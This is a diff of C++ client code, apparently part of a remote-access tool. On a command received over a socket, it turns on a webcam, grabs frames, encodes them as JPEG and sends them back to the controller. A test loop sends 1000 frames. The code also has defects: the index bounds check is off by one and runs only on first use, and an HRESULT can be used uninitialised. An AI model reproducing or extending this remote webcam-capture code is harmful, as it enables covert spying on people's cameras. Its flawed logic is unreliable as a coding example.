@@ -372,30 +372,39 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Single) {
+        HRESULT hr;
+        u_int iDeviceIndex = atoi(strIn[1].c_str());
+        
         if (!this->mod_Cam) {
             this->mod_Cam = new mod_Camera();
-        }
-        std::vector<IMFActivate*> vcCams;
-        HRESULT hr = this->mod_Cam->ListCaptureDevices(vcCams);
-        if (SUCCEEDED(hr) && vcCams.size() > 0) {
-            u_int iDevice = atoi(strIn[1].c_str());
-            if (iDevice > vcCams.size()) {
+            if (iDeviceIndex > this->mod_Cam->vcCams.size()) {
                 //index seleccionado es mas grande que el numero de dispositivos, 
                 // 0 - default
-                iDevice = 0;
+                iDeviceIndex = 0;
             }
-            hr = this->mod_Cam->Init(vcCams[iDevice]);
+        }
+
+        if (!this->mod_Cam->vcActivated[iDeviceIndex]) {
+            hr = this->mod_Cam->Init(this->mod_Cam->vcCams[iDeviceIndex], iDeviceIndex);
+        }
+        
+        //1000 para probar :v
+        for (int ii = 0; ii < 1000; ii++) {
             if (SUCCEEDED(hr)) {
-                DebugPrint("[!] Camara iniciada correctamente");
+                this->iCAMCOUNT++;
+                this->mod_Cam->vcActivated[iDeviceIndex] = true;
+
+                DebugPrint("[!] Camara iniciada correctamente," + std::to_string(this->iCAMCOUNT) + " hasta ahora");
+
                 std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
                 strHeader.append(1, CMD_DEL);
-                
+
                 //Testing
                 int iBufferSize = 0;
                 int iHeaderSize = strHeader.size();
                 u_int iJPGBufferSize = 0;
                 u_int uiPacketSize = 0;
-                BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize);
+                BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize, iDeviceIndex);
                 BYTE* cJPGBuffer = nullptr;
                 BYTE* cPacket = nullptr;
 
@@ -408,7 +417,8 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
                             memcpy(cPacket, strHeader.c_str(), iHeaderSize);
                             memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);
 
-                            this->cSend(this->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
+                            int iSent = this->cSend(this->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
+                            DebugPrint("[!] " + std::to_string(iSent) + " bytes sent");
 
                             delete[] cPacket;
                             cPacket = nullptr;
@@ -423,9 +433,10 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
                     cBuffer = nullptr;
                 }
             }
-        }else {
-            DebugPrint("[X] mod_Cam->ListCaptureDevices error");
         }
+        //}else {
+        //    DebugPrint("[X] mod_Cam->ListCaptureDevices error");
+       // }
 
         return;
     }
@@ -564,6 +575,7 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     if (newBuffer != nullptr) {
         delete[] newBuffer;
     }
+
 
     return iEnviado;
 }
